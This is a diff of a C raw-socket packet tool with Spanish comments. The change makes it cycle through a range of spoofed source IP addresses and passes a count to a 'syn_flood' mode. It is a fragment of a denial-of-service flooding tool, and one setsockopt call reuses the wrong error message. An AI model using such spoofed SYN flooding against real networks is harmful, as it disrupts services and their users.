@@ -42,10 +42,9 @@ int main(int argc, char *argv[]){
 
     //Creamos un socket RAW indica que no se generen los headers del protocolo ni el de ip
 	if(strcmp(argv[5], "udp") == 0){
-		sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
+		sockfd = socket (PF_INET, SOCK_RAW, IPPROTO_UDP);
 	} else if((strcmp(argv[5], "tcp") == 0) || (strcmp(argv[5], "syn_flood") == 0)){
-		printf("Ha entrado");
-		sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
+		sockfd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
 	}
 
     if(sockfd == -1){
@@ -62,8 +61,16 @@ int main(int argc, char *argv[]){
 		perror("Error setting IP_HDRINCL");
 		exit(0);
 	}
+	
+	if (setsockopt (sockfd, SOL_SOCKET, SO_DEBUG, val, sizeof (one)) < 0)
+	{
+		perror("Error setting IP_HDRINCL");
+		exit(0);
+	}
 
-    while(1){//for(i = 0; i < 1; i++){
+    for(i = 0; i < num_addrs; i++){
+
+
 		// direccion IP de destino
 		struct sockaddr_in daddr;
 		daddr.sin_family = AF_INET;
@@ -74,11 +81,17 @@ int main(int argc, char *argv[]){
 			return 1;
 		}
 
+        struct in_addr curr_addr;
+        curr_addr.s_addr = ntohl(net_addr.s_addr) + i;
+        struct in_addr aux;
+        aux.s_addr = htonl(curr_addr.s_addr);
+        char *addr_src = inet_ntoa(aux);
+
 		// direccion IP de origen
 		struct sockaddr_in saddr;
 		saddr.sin_family = AF_INET;
 		saddr.sin_port = htons(rand() % 65535); // random client port
-		if (inet_pton(AF_INET, argv[2], &saddr.sin_addr) != 1)
+		if (inet_pton(AF_INET, addr_src, &saddr.sin_addr) != 1)
 		{
 			printf("source IP configuration failed\n");
 			return 1;
@@ -111,7 +124,7 @@ int main(int argc, char *argv[]){
 			} else {
 				// receive SYN-ACK
 				char recvbuf[DATAGRAM_LEN];
-				int received = receive_from(sockfd, recvbuf, sizeof(recvbuf));
+				int received = receive_from(sockfd, recvbuf, sizeof(recvbuf), &saddr);
 				if (received <= 0)
 				{
 					printf("receive_from() failed\n");
@@ -138,9 +151,10 @@ int main(int argc, char *argv[]){
 				{
 					printf("successfully sent %d bytes ACK!\n", sent);
 				}
+				close(sockfd);
 			}
 		} else if((strcmp(argv[5], "syn_flood") == 0)){
-			syn_flood(sockfd, argv[1], argv[2]);
+			syn_flood(sockfd, argv[1], argv[2], atoi(argv[4]));
 		}
         sleep(1);
     }
